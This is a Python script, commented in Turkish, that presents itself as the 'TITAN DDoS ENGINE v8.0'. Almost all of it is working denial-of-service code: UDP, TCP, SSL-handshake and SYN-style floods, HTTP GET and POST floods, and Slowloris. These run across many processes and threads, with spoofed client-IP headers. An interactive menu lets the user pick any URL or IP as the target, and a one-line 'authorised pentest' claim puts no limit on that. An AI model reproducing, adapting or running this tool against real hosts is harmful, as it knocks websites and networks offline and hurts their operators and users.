#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# TITAN DDoS ENGINE v8.0 - ULTRA MAX GÜÇ
# ============================================================================
# Yetkili pentest için - 8 kaynak ağ + senin WiFi
# Multiprocessing + Multithreading + HyperBurst
# ============================================================================
# KAYNAK AĞLAR:
# 1) Senin WiFi
# 2) 78.181.164.55
# 3) 192.168.1.140
# 4) 192.168.1.138
# 5) 192.168.1.107
# 6) 192.168.0.101
# 7) 192.168.0.105
# ============================================================================

import socket
import threading
import random
import time
import sys
import os
import ssl
import urllib.request
import urllib.error
import hashlib
import multiprocessing
import signal
from datetime import datetime
from urllib.parse import urlparse

# ==================== KONFİGÜRASYON ====================

SOURCE_NETWORKS = [
    {"ip": "78.181.164.55",  "name": "Hedef-Ag-1"},
    {"ip": "192.168.1.140",  "name": "Hedef-Ag-2"},
    {"ip": "192.168.1.138",  "name": "Hedef-Ag-3"},
    {"ip": "192.168.1.107",  "name": "Hedef-Ag-4"},
    {"ip": "192.168.0.101",  "name": "Hedef-Ag-5"},
    {"ip": "192.168.0.105",  "name": "Hedef-Ag-6"},
]

OWN_IP = None

# HEDEF
TARGET = None
TARGET_PORT = 80
TARGET_IS_IP = False

# PERFORMANS - MAX GÜÇ
PROCESSES_PER_NETWORK = 2     # Her ağ için process sayısı
THREADS_PER_PROCESS = 500     # Her process için thread sayısı
BURST_SIZE = 50               # Burst paket sayısı
SOCKET_TIMEOUT = 1
HYPER_BURST = True            # Hyper burst modu (max güç)

# İSTATİSTİK
total_packets = multiprocessing.Value('L', 0)
total_bytes = multiprocessing.Value('L', 0)
total_errors = multiprocessing.Value('L', 0)
running = multiprocessing.Value('b', True)
start_time = 0

def get_own_ip():
    global OWN_IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        OWN_IP = s.getsockname()[0]
        s.close()
        return OWN_IP
    except:
        return "192.168.1.100"

# ==================== ÇEKİRDEK PAKET MOTORU ====================

def hyper_udp_burst(target_ip, target_port, src_ip, burst=BURST_SIZE):
    """Hiper UDP Burst - çoklu paket"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Hyper burst - aynı anda BURST_SIZE*2 kadar paket
        total = burst * (2 if HYPER_BURST else 1)
        for _ in range(total):
            try:
                data = random._urandom(random.randint(512, 1400))
                dst = target_port if target_port else random.randint(1, 65535)
                sock.sendto(data, (target_ip, dst))
            except:
                break
        
        sock.close()
        
        with total_packets.get_lock():
            total_packets.value += total
        with total_bytes.get_lock():
            total_bytes.value += total * 1000
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

def hyper_udp_mtu(target_ip, target_port, src_ip):
    """MTU boyutunda UDP - ağır darbe"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Full MTU paket
        data = random._urandom(65507)
        dst = target_port if target_port else random.randint(1, 65535)
        
        for _ in range(5):  # 5 tane full MTU
            try:
                sock.sendto(data, (target_ip, dst))
            except:
                break
        
        sock.close()
        
        with total_packets.get_lock():
            total_packets.value += 5
        with total_bytes.get_lock():
            total_bytes.value += 5 * 65507
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

def hyper_tcp_flood(target_ip, target_port, src_ip):
    """TCP Flood - bağlan, veri gönder, kapat (hızlı)"""
    try:
        for _ in range(10):  # 10 TCP bağlantısı birden
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setblocking(0)
                
                try:
                    sock.connect((target_ip, target_port))
                except BlockingIOError:
                    pass
                except:
                    sock.close()
                    continue
                
                try:
                    sock.send(random._urandom(256))
                except:
                    pass
                
                sock.close()
            except:
                pass
        
        with total_packets.get_lock():
            total_packets.value += 10
        with total_bytes.get_lock():
            total_bytes.value += 10 * 500
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

def hyper_tcp_data(target_ip, target_port, src_ip):
    """TCP Veri Flood - büyük veri gönderimi"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        sock.connect((target_ip, target_port))
        
        try:
            # Büyük veri gönder
            sock.send(random._urandom(65535))
        except:
            pass
        
        sock.close()
        
        with total_packets.get_lock():
            total_packets.value += 1
        with total_bytes.get_lock():
            total_bytes.value += 65535
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

def hyper_ssl_flood(target_ip, target_port, src_ip):
    """SSL/TLS Handshake Flood - sunucuyu maksimum yor"""
    try:
        for _ in range(3):  # 3 SSL handshake
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.connect((target_ip, target_port))
                
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                try:
                    ssl_sock = ctx.wrap_socket(sock, server_hostname=target_ip)
                    ssl_sock.close()
                except:
                    sock.close()
            except:
                pass
        
        with total_packets.get_lock():
            total_packets.value += 3
        with total_bytes.get_lock():
            total_bytes.value += 3 * 5000
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

def hyper_syn(target_ip, target_port, src_ip):
    """SYN Flood - non-blocking connect"""
    try:
        for _ in range(20):  # 20 yarım bağlantı
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setblocking(0)
                
                try:
                    sock.connect((target_ip, target_port))
                except:
                    pass
                
                sock.close()
            except:
                pass
        
        with total_packets.get_lock():
            total_packets.value += 20
        with total_bytes.get_lock():
            total_bytes.value += 20 * 100
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

# ==================== LAYER 7 - HİPER MOTOR ====================

def hyper_http_flood(target_url, src_ip):
    """HTTP Flood - aynı anda çoklu istek"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        
        for _ in range(5):  # 5 HTTP isteği
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.connect((host, port))
                
                if target_url.startswith('https'):
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                
                path = f"/{random.randint(0,999999)}?{'&'.join([f'p{i}={random.randint(0,9999)}' for i in range(10)])}"
                
                headers = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(110,125)}.0.0.0\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n"
                    f"X-Forwarded-For: {src_ip}\r\n"
                    f"X-Real-IP: {src_ip}\r\n"
                    f"Client-IP: {src_ip}\r\n"
                    f"CF-Connecting-IP: {src_ip}\r\n"
                    f"Referer: https://www.google.com/search?q={random.choice(['test','security','bypass','hack'])}\r\n"
                    f"Sec-Fetch-Dest: document\r\n"
                    f"Sec-Fetch-Mode: navigate\r\n"
                    f"Sec-Fetch-Site: cross-site\r\n"
                    f"\r\n"
                )
                
                sock.send(headers.encode())
                
                try:
                    sock.recv(1024)
                except:
                    pass
                
                sock.close()
            except:
                pass
        
        with total_packets.get_lock():
            total_packets.value += 5
        with total_bytes.get_lock():
            total_bytes.value += 5 * 2000
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

def hyper_post_flood(target_url, src_ip):
    """HTTP POST Flood - büyük veri"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        for _ in range(3):  # 3 POST isteği
            try:
                post_size = 65535  # 64KB
                post_data = random._urandom(post_size)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.connect((host, port))
                
                if target_url.startswith('https'):
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                
                boundary = f"----WebKitFormBoundary{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
                
                body = (
                    f"--{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"file\"; filename=\"data.bin\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n"
                ).encode() + post_data + f"\r\n--{boundary}--\r\n".encode()
                
                request = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0\r\n"
                    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n"
                    f"X-Forwarded-For: {src_ip}\r\n"
                    f"Expect: \r\n"
                    f"\r\n"
                ).encode() + body
                
                sock.send(request)
                try:
                    sock.recv(1024)
                except:
                    pass
                sock.close()
            except:
                pass
        
        with total_packets.get_lock():
            total_packets.value += 3
        with total_bytes.get_lock():
            total_bytes.value += 3 * (65535 + 2000)
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

def hyper_slowloris(target_url, src_ip):
    """Slowloris - bağlantıları canlı tut"""
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.hostname
        port = parsed.port or (443 if target_url.startswith('https') else 80)
        path = parsed.path or '/'
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((host, port))
        
        if target_url.startswith('https'):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        request = (
            f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Accept: */*\r\n"
            f"X-Forwarded-For: {src_ip}\r\n"
            f"Connection: keep-alive\r\n"
        )
        
        sock.send(request.encode())
        
        # 100 header yavaş yavaş gönder
        for i in range(100):
            try:
                sock.send(f"X-Slow-{i}: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10,100)))}\r\n".encode())
                time.sleep(random.uniform(0.5, 2))
            except:
                break
        
        time.sleep(10)  # Bağlantıyı açık tut
        sock.close()
        
        with total_packets.get_lock():
            total_packets.value += 1
        with total_bytes.get_lock():
            total_bytes.value += 5000
        return True
    except:
        with total_errors.get_lock():
            total_errors.value += 1
        return False

# ==================== PROCESS WORKER ====================

def process_worker(target, port, attack_mode, target_url, src_ip, process_id):
    """Her process için worker - hyper thread"""
    
    random.seed(os.getpid() + int(time.time()))
    
    threads = []
    tpw = THREADS_PER_PROCESS
    
    def l4_udp():
        while running.value:
            hyper_udp_burst(target, port, src_ip)
            hyper_udp_mtu(target, port, src_ip)
    
    def l4_tcp():
        while running.value:
            hyper_tcp_flood(target, port, src_ip)
            hyper_tcp_data(target, port, src_ip)
    
    def l4_ssl():
        while running.value:
            hyper_ssl_flood(target, port, src_ip)
    
    def l4_syn():
        while running.value:
            hyper_syn(target, port, src_ip)
    
    def l7_get():
        while running.value and target_url:
            hyper_http_flood(target_url, src_ip)
    
    def l7_post():
        while running.value and target_url:
            hyper_post_flood(target_url, src_ip)
    
    def l7_slow():
        while running.value and target_url:
            hyper_slowloris(target_url, src_ip)
    
    # Thread'leri başlat
    if attack_mode in ["udp", "all4", "all"]:
        for _ in range(tpw // 4):
            t = threading.Thread(target=l4_udp)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["tcp", "all4", "all"]:
        for _ in range(tpw // 4):
            t = threading.Thread(target=l4_tcp)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["ssl", "all4", "all"]:
        for _ in range(tpw // 4):
            t = threading.Thread(target=l4_ssl)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["syn", "all4", "all"]:
        for _ in range(tpw // 4):
            t = threading.Thread(target=l4_syn)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["get", "all7", "all"]:
        for _ in range(tpw // 4):
            t = threading.Thread(target=l7_get)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["post", "all7", "all"]:
        for _ in range(tpw // 4):
            t = threading.Thread(target=l7_post)
            t.daemon = True; threads.append(t); t.start()
    
    if attack_mode in ["slow", "all7", "all"]:
        for _ in range(tpw // 4):
            t = threading.Thread(target=l7_slow)
            t.daemon = True; threads.append(t); t.start()
    
    # Process ID'yi göster
    sys.stdout.write(f"\033[1;36m  [Process {process_id}] {len(threads)} thread ({src_ip})\033[0m\n")
    sys.stdout.flush()
    
    while running.value:
        time.sleep(0.5)

# ==================== İSTATİSTİK ====================

def stats_monitor():
    """Gerçek zamanlı istatistik"""
    global total_packets, total_bytes, total_errors, running, start_time
    
    while running.value:
        time.sleep(1)
        
        with total_packets.get_lock():
            pkts = total_packets.value
        with total_bytes.get_lock():
            bytes_s = total_bytes.value
        with total_errors.get_lock():
            errs = total_errors.value
        
        elapsed = time.time() - start_time
        if elapsed > 1:
            mbps = (bytes_s * 8) / elapsed / 1_000_000
            pps = pkts / elapsed
            mb_total = bytes_s / 1_000_000
        else:
            mbps = 0; pps = 0; mb_total = 0
        
        # Bar göstergesi
        bar_len = 30
        filled = int(bar_len * mbps / 500) if mbps < 500 else bar_len
        bar = "█" * filled + "░" * (bar_len - filled)
        
        sys.stdout.write('\033[2K\r')
        sys.stdout.write(
            f"\n\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
            f"\033[1;33m{bar}\033[0m "
            f"\033[1;31m{mbps:.1f} Mbps\033[0m\n"
            f"\033[1;36m  ├─ 📦 {pkts:,} pkt | ⚡ {pps:,.0f} pps | 💾 {mb_total:.1f} MB | ⏱ {elapsed:.0f}s | ❌ {errs:,}\033[0m\n"
            f"\033[1;36m  └─ 🌐 7 kaynak ağ + Senin WiFi | 🧵 ~{PROCESSES_PER_NETWORK * 7 * THREADS_PER_PROCESS:,} thread\033[0m\n"
            f"\033[1;31m     {'💀 MAX GÜÇ' if mbps > 300 else '🔥 ÇOK YÜKSEK' if mbps > 150 else '⚡ YÜKSEK' if mbps > 50 else '✅ ORTA'}\033[0m\n"
        )
        sys.stdout.flush()

# ==================== ANA MOTOR ====================

def launch_attack(target, port, attack_mode, target_is_ip=False):
    global running, start_time
    
    running.value = True
    start_time = time.time()
    
    with total_packets.get_lock():
        total_packets.value = 0
    with total_bytes.get_lock():
        total_bytes.value = 0
    with total_errors.get_lock():
        total_errors.value = 0
    
    target_url = None
    if not target_is_ip:
        target_url = target
        if not target_url.startswith('http'):
            target_url = f"https://{target_url}"
    
    print(f"\n\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;31m🔥 TITAN DDoS v8.0 - ULTRA MAX GÜÇ 🔥\033[0m")
    print(f"\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}:{port}\033[0m")
    print(f"\033[1;36m🌐 Kaynak Ağlar:\033[0m")
    print(f"\033[1;33m    1) {OWN_IP} (SENIN WiFi)\033[0m")
    for i, net in enumerate(SOURCE_NETWORKS, 2):
        print(f"\033[1;33m    {i}) {net['ip']} ({net['name']})\033[0m")
    print(f"\033[1;36m⚙️  Mod: \033[1;33m{attack_mode.upper()}\033[0m")
    print(f"\033[1;36m⚙️  Hyper Burst: \033[1;32m{HYPER_BURST}\033[0m")
    print(f"\033[1;36m🧵 Process/Ağ: \033[1;33m{PROCESSES_PER_NETWORK}\033[0m")
    print(f"\033[1;36m🧵 Thread/Process: \033[1;33m{THREADS_PER_PROCESS:,}\033[0m")
    total_threads = PROCESSES_PER_NETWORK * (len(SOURCE_NETWORKS) + 1) * THREADS_PER_PROCESS
    print(f"\033[1;36m🧵 Toplam Thread: \033[1;33m{total_threads:,}\033[0m")
    print(f"\033[1;31m{'='*65}\033[0m")
    print(f"\033[1;37m[!] Ctrl+C ile durdur\033[0m")
    print(f"\033[1;37m[!] Her ağ kendi interneti ile MAX GÜÇ saldırıyor\033[0m\n")
    
    # İstatistik
    t = threading.Thread(target=stats_monitor)
    t.daemon = True
    t.start()
    
    # Tüm process'leri başlat
    processes = []
    pid = 0
    
    # Kendi ağımız
    for p in range(PROCESSES_PER_NETWORK):
        proc = multiprocessing.Process(
            target=process_worker,
            args=(target, port, attack_mode, target_url, OWN_IP, f"SeninWiFi-{p+1}")
        )
        proc.daemon = True
        processes.append(proc)
        proc.start()
        pid += 1
        time.sleep(0.05)
    
    # Diğer ağlar
    for net in SOURCE_NETWORKS:
        for p in range(PROCESSES_PER_NETWORK):
            proc = multiprocessing.Process(
                target=process_worker,
                args=(target, port, attack_mode, target_url, net["ip"], f"{net['name']}-{p+1}")
            )
            proc.daemon = True
            processes.append(proc)
            proc.start()
            pid += 1
            time.sleep(0.05)
    
    print(f"\n\033[1;32m[✅] {len(processes)} process başlatıldı")
    print(f"[✅] ~{total_threads:,} thread aktif")
    print(f"[✅] {len(SOURCE_NETWORKS)+1} kaynak ağ saldırıyor!")
    print(f"[✅] Hyper Burst aktif - Her thread {BURST_SIZE*2} paket/gönderim\033[0m\n")
    
    try:
        while running.value:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running.value = False
        elapsed = time.time() - start_time
        
        for proc in processes:
            proc.terminate()
            proc.join(timeout=0.5)
        
        with total_packets.get_lock():
            f_pkts = total_packets.value
        with total_bytes.get_lock():
            f_bytes = total_bytes.value
        with total_errors.get_lock():
            f_errs = total_errors.value
        
        mbps = (f_bytes * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
        
        print(f"\n\n\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;31m⛔ SALDIRI DURDURULDU\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")
        print(f"\033[1;33m📊 Toplam: {f_pkts:,} paket, {f_bytes/1_000_000:.1f} MB\033[0m")
        print(f"\033[1;33m📊 Süre: {elapsed:.0f}s, Hız: {mbps:.1f} Mbps\033[0m")
        print(f"\033[1;33m📊 PPS: {f_pkts/elapsed:,.0f}\033[0m")
        print(f"\033[1;33m📊 Hatalar: {f_errs:,}\033[0m")
        print(f"\033[1;31m{'='*50}\033[0m")

# ==================== MENU ====================

def main():
    global PROCESSES_PER_NETWORK, THREADS_PER_PROCESS, BURST_SIZE, HYPER_BURST, OWN_IP
    
    os.system('clear')
    OWN_IP = get_own_ip()
    
    print("""\033[1;36m
    ╔══════════════════════════════════════════════════╗
    ║        TITAN DDoS ENGINE v8.0                   ║
    ║        ULTRA MAX GÜÇ                            ║
    ║                                                ║
    ║      ├─ Senin WiFi: """ + f"{OWN_IP or 'OTOMATIK'}" + """            ║
    ║      ├─ 78.181.164.55                           ║
    ║      ├─ 192.168.1.140                           ║
    ║      ├─ 192.168.1.138                           ║
    ║      ├─ 192.168.1.107                           ║
    ║      ├─ 192.168.0.101                           ║
    ║      └─ 192.168.0.105                           ║
    ║                                                ║
    ║      Hyper Burst | Multiprocessing | MAX GÜÇ    ║
    ╚══════════════════════════════════════════════════╝
    \033[0m""")
    
    print("\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║        SALDIRI MODU SEÇİN            ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m L4 → UDP Flood (Hyper Burst)      ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m L4 → TCP Flood (Multi Connect)    ║\033[0m")
    print("\033[1;36m║  \033[1;33m[3]\033[1;36m L4 → SSL/TLS Flood               ║\033[0m")
    print("\033[1;36m║  \033[1;33m[4]\033[1;36m L4 → SYN Flood (Rapid)            ║\033[0m")
    print("\033[1;36m║  \033[1;33m[5]\033[1;36m L4 → TÜMÜ (UDP+TCP+SSL+SYN)       ║\033[0m")
    print("\033[1;36m║  \033[1;33m[6]\033[1;36m L7 → HTTP GET Flood               ║\033[0m")
    print("\033[1;36m║  \033[1;33m[7]\033[1;36m L7 → HTTP POST Flood (64KB)       ║\033[0m")
    print("\033[1;36m║  \033[1;33m[8]\033[1;36m L7 → Slowloris                    ║\033[0m")
    print("\033[1;36m║  \033[1;33m[9]\033[1;36m L7 → TÜMÜ (GET+POST+Slow)         ║\033[0m")
    print("\033[1;36m║  \033[1;31m[10]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)            ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    choice = input("\n\033[1;33m[?] Seçim (1-10): \033[0m").strip()
    
    modes = {
        "1": "udp", "2": "tcp", "3": "ssl", "4": "syn",
        "5": "all4", "6": "get", "7": "post", "8": "slow",
        "9": "all7", "10": "all"
    }
    
    if choice not in modes:
        print("\033[1;31m[!] Geçersiz!\033[0m")
        return
    
    attack_mode = modes[choice]
    
    print("\n\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║           HEDEF SEÇİN                 ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;33m[1]\033[1;36m URL (site.com)                  ║\033[0m")
    print("\033[1;36m║  \033[1;33m[2]\033[1;36m IP Adresi                       ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    tc = input("\n\033[1;33m[?] Seçim (1-2): \033[0m").strip()
    
    target = None
    port = 80
    is_ip = False
    
    if tc == "1":
        target = input("\033[1;33m[?] Hedef URL: \033[0m").strip()
        if not target.startswith('http'):
            target = f"https://{target}"
        is_ip = False
        port_str = input("\033[1;33m[?] Port (443): \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 443
    elif tc == "2":
        target = input("\033[1;33m[?] Hedef IP: \033[0m").strip()
        is_ip = True
        port_str = input("\033[1;33m[?] Port: \033[0m").strip()
        try:
            port = int(port_str)
        except:
            port = 80
    else:
        print("\033[1;31m[!] Geçersiz!\033[0m")
        return
    
    # Güç ayarları
    tc = input(f"\033[1;33m[?] Thread/Process (varsayılan: {THREADS_PER_PROCESS}, max 2000): \033[0m").strip()
    if tc:
        try:
            THREADS_PER_PROCESS = max(100, min(2000, int(tc)))
        except:
            pass
    
    pc = input(f"\033[1;33m[?] Process/Ağ (varsayılan: {PROCESSES_PER_NETWORK}, max 4): \033[0m").strip()
    if pc:
        try:
            PROCESSES_PER_NETWORK = max(1, min(4, int(pc)))
        except:
            pass
    
    bc = input(f"\033[1;33m[?] Burst boyutu (varsayılan: {BURST_SIZE}, max 100): \033[0m").strip()
    if bc:
        try:
            BURST_SIZE = max(10, min(100, int(bc)))
        except:
            pass
    
    hb = input(f"\033[1;33m[?] Hyper Burst (e/h, varsayılan: e): \033[0m").strip().lower()
    HYPER_BURST = hb != 'h'
    
    launch_attack(target, port, attack_mode, is_ip)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
